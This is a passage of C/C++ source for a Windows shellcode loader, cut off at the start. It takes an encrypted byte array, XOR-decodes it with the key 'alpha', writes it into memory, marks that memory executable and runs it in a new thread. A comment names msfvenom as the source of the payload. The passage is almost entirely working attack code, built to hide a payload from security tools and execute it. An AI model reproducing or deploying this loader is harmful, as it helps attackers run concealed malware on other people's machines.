\x7c\xd0\x1e\x3f\xec\xe9\x2e\x56\x48\xa7\xf7\xfa\xcd\x18\xa3\x17\x55\x7f\x47\xac\xd4\xb8\x4c\xec\x34\x14\xb7\x5\xa0\x96\x18\xa8\x35\xed\x6a\xc5\xbd\x1f\xbe\x61\xc\xd3\x42\x9a\x9c\xef\x18\x3b\x18\xaa\x70\x5f\x9d\x45\xa2\x8a\xe5\x1f\x4e\x37\x64\xd2\x4e\x47\xe4\xe8\xff\xee\x70\xa5\xed\x12\xc5\x46\x4\xb8\x4d\x1f\x27\xc4\xdc\xd1\xfa\x74\x4c\xeb\x8b\x9d\xa8\xa5\x56\xc0\x2d\x43\x76\x6d\xb5\x4a\x20\xe7\x77\xdf\xcd\xbb\x2f\xd6\xcd\xb6";




	HANDLE  processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 1, GetCurrentProcessId());
	if (processHandle == 0) {

		printf("error, unable to self process \n");
		int z = GetLastError();
		return 0;
	}

	// use VirtualAllocEx for remote process
	//	LPVOID  a  = (LPVOID) VirtualAllocEx(processHandle,NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID  a = (LPVOID)VirtualAlloc(0, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (a == 0) {
		printf("error allocating memory - \n" + GetLastError());
		//int b = GetLastError();
		return 0;
		//printf("Printing last error\n");
	}


	printf("XORring\n");
	unsigned char key[] = "alpha";
	unsigned char* final_buffer = do_thing(encrypted, key);


	SIZE_T bytes = 0;






	//void *new_addr = memcpy(a, my_shell, 1024);	
	BOOL result_bool = WriteProcessMemory(
		processHandle,
		a,
		(LPCVOID)final_buffer, //cast into pointer type acceptable to windows
		2048,  // trying dynamically
		&bytes);
	if (result_bool == 0) {
		printf("Couldn't write process memory (%d).\n", GetLastError());
		return 0;
	}

	//delete[] final_buffer;

	//actually needs execute+read_write to allow for msfvenom payload to unpack :(
	DWORD old; // dont care about this
	BOOL vp = VirtualProtect(a, 4096, PAGE_EXECUTE_READWRITE,  &old);

	printf("old permissions are %d", old);
	/*
	LPVOID  b = (LPVOID)VirtualAlloc(a, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE);
	if (b == 0) {
		//printf("error allcating memory second time around\n");
		int b = GetLastError();
		return 0;
		//printf("Printing last error\n");
	}

	if (&a == &b) {
		printf("Pointer A and B have same address");
	}
	*/


	DWORD thread_id;
	DWORD* test = &thread_id;

	HANDLE remoteThread_h = CreateRemoteThread(
		processHandle,
		NULL, //lpthreadattributes
		(SIZE_T)1024, //dwstacksize
		(LPTHREAD_START_ROUTINE)a, //lpstartaddress
		NULL, //lpvoid lpparameter
		0,
		test);
	if (remoteThread_h == 0) {
		printf("Couldn't create remote thread.\n" + GetLastError());
		return 0;
	}
	printf("all good so far\n");
	printf("New thread id is %d.\n", thread_id);



	WaitForSingleObject(remoteThread_h, INFINITE);
	DWORD thread_error = GetThreadErrorMode();
	if (thread_error == NULL) {
		printf("No thread error code\n");
		return 0;
	}
	printf("Thread error mode is %d.\n", thread_error);
	return 1;
}